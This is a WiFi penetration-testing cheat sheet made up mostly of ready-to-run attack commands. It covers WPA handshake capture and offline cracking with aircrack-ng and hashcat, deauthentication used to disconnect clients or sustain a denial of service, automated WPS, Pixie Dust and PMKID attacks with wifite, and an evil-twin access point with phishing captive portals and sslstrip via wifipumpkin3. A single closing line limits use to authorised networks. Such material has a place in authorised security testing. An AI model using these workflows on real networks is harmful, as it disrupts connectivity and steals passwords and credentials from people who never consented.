# WIFI ATTACKS COMPLETE CHEAT SHEET

## 1. WHAT IS WIFI PENTESTING?

**WiFi pentesting** targets 802.11 networks. Common goals:

- **Crack WPA/WPA2 passwords** (handshake, PMKID)
- **Attack WPS** (Pixie Dust, brute force PIN)
- **Evil Twin** (fake AP to capture credentials)
- **Deauth attacks** (DoS, force handshake)
- **Captive portals** (phishing over WiFi)

**Key fact:** Requires an adapter that supports **monitor mode** and **packet injection**.

---

## 2. ADAPTER PREP

```bash
# Enable monitor mode
sudo airmon-ng start wlan0
sudo airmon-ng check kill

# Stop monitor mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager

# Interface list
iw dev
iwconfig
```

---

## 3. AIRCRACK-NG — WPA HANDSHAKE CAPTURE

### 3.1 Full Workflow

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Scan networks
sudo airodump-ng wlan0mon

# 3. Target specific network
sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w handshake wlan0mon

# 4. Deauth a client to force handshake
sudo aireplay-ng -0 10 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# 5. Verify handshake captured
aircrack-ng handshake.cap

# 6. Crack with aircrack
sudo aircrack-ng -w rockyou.txt -b [BSSID] handshake.cap

# 7. Or convert for hashcat
cap2hccapx handshake.cap handshake.hccapx
hashcat -m 2500 handshake.hccapx rockyou.txt --force
```

### 3.2 DoS / Disconnect

```bash
sudo aireplay-ng -0 0 -a [BSSID] -c [CLIENT_MAC] wlan0mon
```

---

## 4. WIFITE — AUTOMATED WIFI ATTACKS

```bash
sudo wifite                              # interactive mode
sudo wifite -i wlan0mon                  # specific interface
sudo wifite --wps                        # WPS attacks (Pixie Dust)
sudo wifite --handshake                  # capture WPA handshakes
sudo wifite --pmkid                      # PMKID attack
sudo wifite -c 1,6,11                    # specific channels
sudo wifite --dict /usr/share/wordlists/rockyou.txt
sudo wifite --mac AA:BB:CC:DD:EE:FF      # spoof MAC
sudo wifite -v                           # verbose
```

**Typical flow:**
1. Enable monitor mode.
2. Run `wifite` — it scans and offers options.
3. Select target or let it auto-attack.
4. Cracks with aircrack/hashcat automatically.

---

## 5. WIFIPUMPKIN3 — EVIL TWIN / CAPTIVE PORTAL

```bash
sudo apt install wifipumpkin3
sudo wifipumpkin3 -i wlp1s0             # start console UI
```

**From the interactive UI:**
- Create / edit SSID (fake AP)
- Enable **captive portal** with phishing templates
- Enable / log HTTP/HTTPS traffic
- Activate plugins (sslstrip, responder, MITM modules)
- Check logs folder for captures

**Tips:**
- Run as root.
- WiFi adapter must support **AP mode** (not just monitor).
- Prepare captive portal templates before launching.
- Official docs: https://docs.wifipumpkin3.com

---

## 6. TIPS

1. Always start with `airmon-ng check kill` — kills interfering processes.
2. Use `wifite` first for automation; go manual only if needed.
3. PMKID attacks don't require a client (no deauth needed).
4. WPS Pixie Dust is fast; brute-force PIN is slow but reliable.
5. Evil Twin + captive portal = credential capture.
6. Use a good adapter (Atheros AR9271, Alfa AWUS036NHA).
7. Save all `.cap` files — crack offline with hashcat.
8. Only test networks you own or have written permission for.
